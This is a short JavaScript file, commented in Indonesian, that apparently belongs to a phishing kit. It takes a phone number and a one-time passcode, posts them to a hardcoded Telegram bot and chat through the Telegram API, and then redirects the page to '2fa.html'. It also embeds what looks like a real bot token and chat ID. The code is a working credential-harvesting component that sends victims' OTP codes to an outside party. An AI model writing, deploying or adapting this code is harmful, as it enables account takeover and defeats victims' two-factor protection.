// Fungsi untuk mengirim OTP ke Telegram
function sendOtpToTelegram(otpCode, phoneNumber) {
    // Token Bot Telegram dan Chat ID
    const botToken = '8798021653:AAFFnZc4B6Fbx1XRcVkVUrPstfg2W-oukP0'; // Ganti dengan token bot Anda
    const chatId = '7437326858'; // Ganti dengan chat ID Anda

    // Membuat pesan untuk dikirim
    const message = `
        🔔 *OTP Alert*\n\n
        📞 *Nomor:* \`${phoneNumber}\`\n
        🔑 *OTP Code:* \`${otpCode}\`\n
        \n✅ _Please verify the OTP and proceed._
    `;

    // URL API Telegram untuk mengirim pesan
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Data yang akan dikirim melalui POST request
    const data = {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
    };

    // Mengirim permintaan menggunakan fetch API
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data) // Mengonversi objek JavaScript ke JSON
    })
    .then(response => response.json()) // Mengonversi respons ke JSON
    .then(data => {
        if (data.ok) {
            console.log('OTP sent to Telegram successfully.');
            // Redirect jika OTP berhasil dikirim
            window.location.href = '2fa.html';
        } else {
            console.error('Failed to send OTP to Telegram:', data);
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Contoh pemanggilan fungsi dengan data OTP dan Nomor Telepon
const otpCode = '12345'; // Gantilah dengan OTP yang sesuai
const phoneNumber = '08123456789'; // Gantilah dengan nomor telepon yang sesuai
sendOtpToTelegram(otpCode, phoneNumber);
